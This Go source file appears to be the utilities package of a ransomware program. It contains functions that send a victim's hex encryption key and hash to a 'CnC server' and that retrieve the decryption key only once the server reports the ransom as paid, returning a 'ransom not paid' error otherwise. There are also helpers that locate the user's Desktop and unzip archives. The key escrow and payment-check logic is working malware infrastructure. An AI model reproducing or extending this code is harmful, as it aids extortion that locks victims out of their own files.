package utils

import (
	"archive/zip"
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
)

const host string = "http://localhost:3000/api/"

func FindStringIndex(strArr []string, target string) int {
	c := len(strArr)
	for i := 0; i < c; i++ {
		if strings.Compare(target, strArr[i]) == 0 {
			return i
		}
	}
	return -1
}

func RemoveAtIndex(strArrPtr **[]string, index int) []string {
	strArr := **strArrPtr
	newArr := append(strArr[:index], strArr[index+1:]...)
	*strArrPtr = &newArr
	return newArr
}

func GetDesktopLocation() string {
	home, err := os.UserHomeDir()
	if err != nil {
		log.Fatal(err)
	}
	return filepath.Join(home, "Desktop")
}

func SendOffKey(hexKey string, hash string, paid bool, OfflineMode bool) (bool, error) {
	if OfflineMode {
		return false, errors.New("failed to contact CnC server")
	}
	jsonBody, err := json.Marshal(KeySendoffStruct{
		Key:  hexKey,
		Hash: hash,
		Paid: paid,
		V3:   true,
	})
	if err != nil {
		return false, err
	}
	resp, err := http.Post(host+"v2", "application/json", bytes.NewBuffer(jsonBody))
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	println(body)
	return resp.StatusCode == 200, err
}

func RetriveKeyByHash(hash string, OfflineMode bool) (string, error) {
	if OfflineMode {
		return "", errors.New("failed to contact CnC server")
	}
	resp, err := http.Get(host + "v2/" + hash)
	if err != nil || resp.StatusCode != 200 {
		return "", errors.New("failed to contact CnC server")
	}
	if resp.Body != nil {
		defer resp.Body.Close()
	}
	rawBody, _ := ioutil.ReadAll(resp.Body)
	response := unmarshalMessage(string(rawBody))
	if response.Status == string(ERROR) {
		return "", errors.New("failed to parse JSON")
	}
	if response.Status == string(UNPAID) {
		return response.Message, errors.New("ransom not paid")
	}
	return response.Key, nil
}

func unmarshalMessage(jsonString string) GetKeyResponse {
	var r GetKeyResponse
	err := json.Unmarshal([]byte(jsonString), &r)
	if err != nil {
		return GetKeyResponse{
			Key:     "",
			Status:  "ERROR",
			Message: "Failed to parse JSON",
		}
	}
	return r
}

func CheckIfServerIsOnline() bool {
	resp, err := http.Get(host + "test")
	if err != nil {
		return false
	}
	return resp.StatusCode == 200
}

func ObtainKey(hash string) ([]byte, error) {
	resp, err := http.Get(host + "v2/" + hash)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	println(body)
	return body, err
}

func unzip(src []byte, dest string) ([]string, error) {
	var filenames []string

	// r, err := zip.OpenReader(src)
	rb := bytes.NewReader(src)
	r, err := zip.NewReader(rb, int64(len(src)))
	if err != nil {
		return filenames, err
	}
	//defer r.Close()

	for _, f := range r.File {

		// Store filename/path for returning and using later on
		fpath := filepath.Join(dest, f.Name)

		// Check for ZipSlip. More Info: http://bit.ly/2MsjAWE
		if !strings.HasPrefix(fpath, filepath.Clean(dest)+string(os.PathSeparator)) {
			return filenames, fmt.Errorf("%s: illegal file path", fpath)
		}

		filenames = append(filenames, fpath)

		if f.FileInfo().IsDir() {
			// Make Folder
			os.MkdirAll(fpath, os.ModePerm)
			continue
		}

		// Make File
		if err = os.MkdirAll(filepath.Dir(fpath), os.ModePerm); err != nil {
			return filenames, err
		}

		outFile, err := os.OpenFile(fpath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
		if err != nil {
			return filenames, err
		}

		rc, err := f.Open()
		if err != nil {
			return filenames, err
		}

		_, err = io.Copy(outFile, rc)

		// Close the file without defer to close before next iteration of loop
		outFile.Close()
		rc.Close()

		if err != nil {
			return filenames, err
		}
	}
	return filenames, nil
}
